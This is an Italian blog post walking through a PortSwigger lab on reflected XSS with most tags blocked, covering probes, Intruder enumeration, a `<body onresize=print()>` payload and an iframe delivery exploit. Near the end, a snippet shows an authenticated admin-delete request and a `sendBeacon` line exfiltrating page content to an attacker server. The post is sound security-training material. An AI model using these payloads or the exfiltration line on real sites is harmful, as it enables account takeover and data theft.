---
layout: post
title: "Niente encoding, ogni tag bloccato"
date: 2026-10-03
categories: [web-security, walkthrough]
tags: [bscp, burp-suite, burp-intruder, burp-scanner, xss, reflected, waf-bypass, portswigger]
excerpt: "Il probe è tornato indietro completamente nudo — parentesi angolari, virgolette, tutto raw, il classico caso 'nothing encoded'. Allora mando <script> e mi ritrovo un 400 'Tag is not allowed'. Il filtro sui caratteri e il filtro sui tag sono due muri diversi, e il probe ne vede uno solo."
lang: it
page_id: reflected-xss-tags-blocked-mystery-lab
permalink: /posts/reflected-xss-tags-blocked-mystery-lab/
---

Avevo mandato nel campo di ricerca il probe più innocuo che conosco — `zzz'"<>` — ed era tornato nella risposta completamente nudo: `'` raw, `"` raw, `<` raw, `>` raw, nemmeno un `&lt;` da nessuna parte. È il caso da manuale, il grado zero. Niente encoding. Quel tipo di riflessione in cui il payload è un copia-incolla dal libro e hai finito prima che il caffè si raffreddi.

Così scrivo la cosa ovvia, `<script>print()</script>`, premo invio, e il server risponde:

```
HTTP/2 400 Bad Request
"Tag is not allowed"
```

Una riflessione che lascia passare raw ogni carattere pericoloso, attaccata a un server che rifiuta il tag più elementare del linguaggio. Entrambe vere, nello stesso campo di input, nello stesso respiro.

Quel gap — aperto ai caratteri, chiuso al tag — è il post.

## Setup: seconda sessione XSS, Mystery Lab ancora filtrato

La [sessione scorsa](/posts/dom-cookie-manipulation-mystery-lab/) era stata il mio primo XSS dentro il Mystery Lab Challenge — quello che si era rivelato un reflected XSS server-side travestito da "DOM". Questa è la seconda, stessa mossa: apro il Mystery Lab, lo filtro su **XSS** e lascio che mi serva qualcosa senza dirmi la difficoltà.

Ho camminato l'app con il proxy acceso, senza fare niente di furbo — solo costruendo la mappa di *dove torna il mio input*. Il campo di ricerca era il candidato ovvio. Uno scan mirato sulla request `GET /?search=...` e Burp l'ha segnalato subito:

> **Cross-site scripting (reflected)** — il valore del parametro `search` è copiato nella risposta.

La request che Burp ha usato per dimostrarlo era questa:

```
GET /?search=ciao%3cLeHIF%3e
```

Prima di inseguire il payload, volevo capire cosa *fosse* quella request. Perché non è un payload — è una domanda, e saper leggere la domanda è tutta la skill.

## 1. Cosa sta chiedendo davvero il probe

Decodifica il parametro e vedi che Burp ha mandato `ciao<LeHIF>`. Due parti, due compiti.

`LeHIF` è un **marcatore casuale**. Non fa niente di offensivo. Il suo unico scopo è essere una stringa che non potrebbe mai comparire nella pagina per caso, così puoi fare `Ctrl+F` nella risposta e atterrare esattamente dove il server ha scritto il tuo input. (A mano uso `zzz` per lo stesso motivo — so già cosa ho cercato.)

Le `<` e `>` attorno sono la domanda vera, ed è più affilata di "il mio testo torna indietro?". Un campo di ricerca riflette quasi sempre il termine. La domanda è:

> **i caratteri strutturali sopravvivono, oppure l'app li neutralizza?**

È tutta lì la linea tra innocuo e XSS. Esistono esattamente quattro caratteri con un significato *strutturale* in HTML — quelli che possono sollevarti dal testo e portarti nel codice:

| Carattere | Ruolo strutturale | Perché lo testi |
|---|---|---|
| `<` | apre un tag | se sopravvive, puoi creare tag tuoi |
| `>` | chiude un tag | ti serve per completare/aprire un tag |
| `"` | delimita un attributo con virgolette doppie | ti fa uscire *da* un attributo |
| `'` | delimita un attributo con apici singoli | idem, per gli apici singoli |

Quindi li ho mandati tutti e quattro insieme — `zzz'"<>` — in una sola request. Non sai ancora in *quale contesto* cadrai, e contesti diversi richiedono chiavi diverse, perciò testi tutto il mazzo in un colpo e leggi la risposta dalla pagina. Ecco cosa è tornato:

```html
<h1>0 search results for 'zzz'"<>'</h1>
```

Leggilo con la tabella in mano:

1. **`zzz` mi ha posizionato** → sono dentro un `<h1>`, in **testo HTML libero**.
2. **`<` e `>` sono raw** (non `&lt;`/`&gt;`) → posso aprire un tag. Porta spalancata.
3. **Anche `'` e `"` sono raw** → potrei uscire da un attributo… solo che non *sono* dentro un attributo. Quelle `'...'` attorno sono decorazione del template, testo come tutto il resto. Niente da cui scappare.

Quest'ultimo punto conta: in testo HTML libero **non c'è nessun break-out da fare**. A differenza del [lab sul cookie](/posts/dom-cookie-manipulation-mystery-lab/), dove dovevo chiudere una virgoletta *e* chiudere un tag *e* aprire il mio, qui apro un tag e basta, e il parser lo prende sul serio. Il probe diceva: *testo libero, le angolari passano, vai.*

E sono andato.

## 2. Il 400 che ha riscritto il lab

`<script>print()</script>` → `400 "Tag is not allowed"`.

Sono onesto sul mezzo secondo di spaesamento, perché è il senso di tutta la sessione. Il probe mi aveva appena detto, in byte nudi, che `<` e `>` tornano intatti. E *tornano* intatti. Allora perché una stringa fatta esattamente di quei caratteri viene rifiutata?

La risposta è che **il probe e il server stanno controllando due cose diverse, su due layer diversi.**

- Il mio probe `zzz'"<>` finisce con `<>` — un `<` immediatamente seguito da `>`, niente in mezzo. `<>` **non è un nome di tag valido**. Per un filtro che cerca tag, è rumore. Passa liscio.
- `<script>` è `<` seguito da **un nome di tag che il server riconosce**. Ed è *quello* a essere bloccato.

Quindi non è un filtro a livello di **carattere** (non sta encodando `<` in `&lt;` — l'abbiamo dimostrato). È un filtro a livello di **tag**: fa il parsing del mio input, vede che sto cercando di aprire un tag, guarda *quale* tag, e se è in blacklist, 400. I caratteri sono liberi. I *token* sono sorvegliati. E il probe, per costruzione, misura solo i caratteri — un filtro sui tag letteralmente non può vederlo, perché `<>` non assomiglia a un tag.

È la stessa lezione dell'altra volta — ogni layer mente su quello dopo — ma su un layer che non avevo pensato di diffidare. Un probe che lascia passare i caratteri **non** garantisce che passino i tag. Carattere e token sono due muri distinti, e io avevo testato solo il primo.

Questo riscrive l'intero lab. Non è "nothing encoded" (il caso facile). È **most tags and attributes blocked**: ti lasciano iniettare HTML, poi ti tolgono i mattoni ovvi. Il lavoro non è più "scrivi il payload". È **"scopri cosa si sono dimenticati di bloccare."**

## 3. Smetti di indovinare, inizia a enumerare

Ecco il cambio di mentalità. Finché pensavo fosse aperto, tirare *un* payload aveva senso. Nel momento in cui c'è una blacklist, tirare payload alla cieca è la mossa peggiore: se `<img onerror=...>` fallisce, non so se è bloccato `img`, o `onerror`, o la mia sintassi. Devo **separare le domande** e risponderne una alla volta. È per questo che esiste Burp Intruder.

**Fase A — quale tag sopravvive?** Marcatore sul *solo nome* del tag, angolari fisse, payload list = ogni tag HTML dell'XSS cheat sheet di PortSwigger:

```
GET /?search=<§§>
```

Ordina per status code e la blacklist si tradisce da sola. Ogni variante `<script>...` — e nella lista ce n'erano parecchie ingegnose — è tornata `400`:

```
<script>onerror=alert;throw 1</script>                → 400
<script>{onerror=alert}throw 1</script>               → 400
<script>throw onerror=eval,'=alert\x281\x29'</script> → 400
```

`script` è in blacklist. Ogni rimescolamento creativo muore allo stesso modo. Smetti di guardarli — stessa porta chiusa.

I `200` sono l'oro:

```
<body onresize="print()">                → 200
<body onpagereveal=alert(1)>             → 200
<body onpageswap=navigator.sendBeacon(…)> → 200
```

**La Fase B cade fuori dallo stesso run.** I sopravvissuti non sono solo un tag — sono un tag *e* un evento che è passato. `<body>` è permesso. E su `<body>`, gli eventi `onresize`, `onpagereveal`, `onpageswap` sono permessi. Il filtro non è "niente tag" — è "non i tag ed eventi *soliti*". `script`, `img`/`onerror`, i famosi, spariti. Qualcuno è scappato dalla rete. Trovare la coppia dimenticata è tutto il gioco, e Intruder più il cheat sheet è come la trovi sotto pressione d'esame, senza indovinare.

(Vale la pena notare *perché* quei tre sono sopravvissuti: `onpagereveal` e `onpageswap` sono eventi nuovissimi. Le blacklist si scrivono a mano, e una lista scritta a mano non conosce eventi usciti l'anno scorso. Non è un dettaglio — è tutto il modello di business del cheat sheet, su cui torno.)

## 4. Il payload accettato che non fa niente

`<body onresize=print()>` è tornato `200`. Il contesto è testo HTML libero, quindi niente break-out — il payload è proprio quello, pulito:

```
<body onresize=print()>
```

Ed ecco la trappola che il `200` nasconde. Metti `/?search=<body onresize=print()>` dritto nel browser e **non succede niente**. Nessun `print()`. Il payload è accettato, sta nel DOM, e sembra morto stecchito.

Non è morto. Un event handler non scatta da solo — **qualcosa deve innescarlo.** `onresize` aspetta che la finestra faccia resize, e caricare una pagina normalmente non ridimensiona nulla. Non è un difetto del mio payload; è la definizione dell'evento.

Ed è esattamente per questo che `onresize` è il sopravvissuto *intenzionale*: si può innescare **dall'esterno**. Metti la pagina vulnerabile dentro un `<iframe>`, poi cambi la dimensione dell'iframe → la finestra dentro fa resize → `onresize` scatta → `print()`. L'injection non è mai stata la parte difficile. La difficoltà è la delivery.

## 5. La delivery (e la parte sospetta: è andata al primo colpo)

La vittima è un bot che apre il link del mio exploit server una volta, nel suo browser. Quindi l'exploit è un iframe che carica la search avvelenata e poi si ridimensiona:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cbody%20onresize=print()%3E"
        onload="this.style.width='100px'">
</iframe>
```

- **`src`** carica la search con il payload. La pagina si disegna, `<body onresize=print()>` finisce nel DOM, e `print()` **non** scatta ancora — nessun resize è avvenuto.
- **`onload`** scatta quando l'iframe ha finito di caricare → cambio la sua `width` → l'iframe si ridimensiona → la finestra dentro fa **`onresize`** → **`print()`**.

(Le angolari nel `src` sono URL-encodate `%3C`/`%3E` perché vivono dentro un attributo HTML dell'iframe — tieni pulito il parsing dell'attributo stesso.)

Incollo nel body dell'exploit server, **Store**, **View exploit** per provarlo su di me, **Deliver to victim**. Risolto — primo colpo, nessun errore.

Lo segnalo perché l'emozione onesta qui non è trionfo, è un lieve sospetto. Dopo il lab sul cookie, dove la delivery era la parte che mi aveva dato battaglia, vedere l'iframe funzionare al primo tentativo è sembrato *troppo* liscio — come se avessi saltato un passaggio. Non l'avevo saltato. Il motivo per cui è filata è che il costo di comprensione l'avevo già pagato nel punto 4: sapevo *prima* di scrivere l'iframe che `onresize` non scatta da solo, quindi ho costruito il trigger dall'inizio invece di scoprire che mi serviva. La delivery è stata facile perché la diagnosi era fatta. Ed è questa la vera lezione sulla delivery — è facile in proporzione a quanto bene hai capito prima la condizione di innesco del payload.

## Il pattern sotto

La sorpresa di questo lab si comprime in una frase: **un probe che lascia passare i caratteri non ti dice niente sui token.** Il mio `zzz'"<>` ha dimostrato che `<` e `>` sopravvivono, ed era vero — e completamente inutile per prevedere che `<script>` avrebbe dato 400. Encoding a livello di carattere e blacklisting a livello di token sono due muri indipendenti. Ho testato il primo e dato per scontato che il secondo non esistesse. Il `400` era il secondo muro che si presentava.

E la cosa che generalizza oltre questo singolo lab: **il valore non è sapere `<script>alert(1)</script>`.** Quello lo blocca chiunque. Il valore è sapere cosa *resta* quando l'ovvio è sparito — il tag inconsueto (`<body>`, `<math>`, SVG), l'evento di cui l'autore della blacklist non ha mai sentito parlare (`onpagereveal` è uscito troppo di recente per stare su qualsiasi lista). È per questo che il cheat sheet esiste e continua ad aggiornarsi: è un tabellone vivo nella corsa tra chi scrive le blacklist e chi trova il tag che si sono dimenticati. Oggi quella corsa l'ho vista accadere in tre `200`.

Quanto a cosa ti *compra* il bug — il motivo per cui tutto questo conta oltre un lab:

```javascript
// Il payload non è il punto. Questo è ciò che gira una volta che un tag scatta:
fetch('/admin/delete?user=carlos', {credentials:'include'});   // agisci come la vittima
navigator.sendBeacon('//my-server/', document.body.innerHTML); // esfiltra quello che vede
```

Un XSS esegue il *tuo* JavaScript nell'origine dell'app, come la vittima. Erediti tutto quello che l'app può fare nel suo browser: leggere il DOM, leggere i cookie non-`HttpOnly`, e — il cuore moderno — fare richieste autenticate *al posto suo*, cookie allegati in automatico, token CSRF letti direttamente dalla pagina. `print()` prova solo che il motore gira. All'esame è il ponte verso l'admin (consegni l'XSS → il suo browser esegue un `fetch` privilegiato → scali). Sul campo è reflected-XSS-più-un-pretesto: un link alla persona giusta, di solito un admin, e la sua sessione diventa il tuo proxy verso cose che non raggiungi direttamente.

## Cosa viene dopo

Il filo aperto è l'altro tipo di evento. `onresize` ha bisogno di un innesco *esterno*, ed è per questo che la delivery ha richiesto un iframe che facesse il resize. Ma alcuni dei sopravvissuti non ne hanno bisogno — `onpagereveal` e `onpageswap` scattano sulla navigazione stessa, nessun resize richiesto. La delivery collasserebbe a un singolo link semplice con uno di quelli? E più in generale: questa blacklist è stata battuta dalla *novità*. Il prossimo filtro non lo sarà. La domanda che si apre è cosa fai quando la blacklist è aggiornata — quando non c'è nessun evento dimenticato, e la via d'uscita sono trucchi di encoding, confusione di contesto, o un sink che fa il parsing del tuo input due volte. È lì che "trova il tag che hanno dimenticato" smette di funzionare e inizia qualcosa di più difficile. Prossimi lab.

## Takeaways

- **Un probe che lascia passare i caratteri non dice niente sui token.** `zzz'"<>` ha dimostrato che `<`/`>` sopravvivono ed è stato inutile contro una blacklist a livello di tag — `<>` non assomiglia a un tag, quindi il filtro non l'ha mai visto. Carattere e token sono due muri distinti.
- **"Reflected XSS" non è una difficoltà sola.** Stesso cartello della sessione scorsa; l'altra volta era un copia-incolla, stavolta una blacklist. La difficoltà vive in *quanto encoding c'è* e in *che contesto cadi*, mai nel nome.
- **Quando c'è una blacklist, enumera — non indovinare.** Intruder sul nome del tag, poi sull'evento, con le liste del cheat sheet. Un payload alla cieca che fallisce non ti dice *quale* parte è fallita; un run di Intruder ordinato te lo dice esatto.
- **Un payload `200` può comunque essere inerte.** `<body onresize=print()>` è accettato e non fa niente finché qualcosa non ridimensiona la finestra. Un event handler è pericoloso solo quanto il suo trigger.
- **La delivery è facile in proporzione a quanto hai capito la condizione di innesco.** È andata al primo colpo perché sapevo che `onresize` serviva un trigger esterno *prima* di scrivere l'iframe — non dopo.

## Riferimenti utili

- [PortSwigger — Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
- [PortSwigger — Cross-site scripting cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PortSwigger — Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- [PortSwigger — Using Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder)

---

*Tutte le tecniche mostrate sono state eseguite in un ambiente di laboratorio isolato (la Web Security Academy di PortSwigger). Attaccare sistemi che non possiedi o per cui non hai un'autorizzazione scritta è illegale nella maggior parte delle giurisdizioni.*
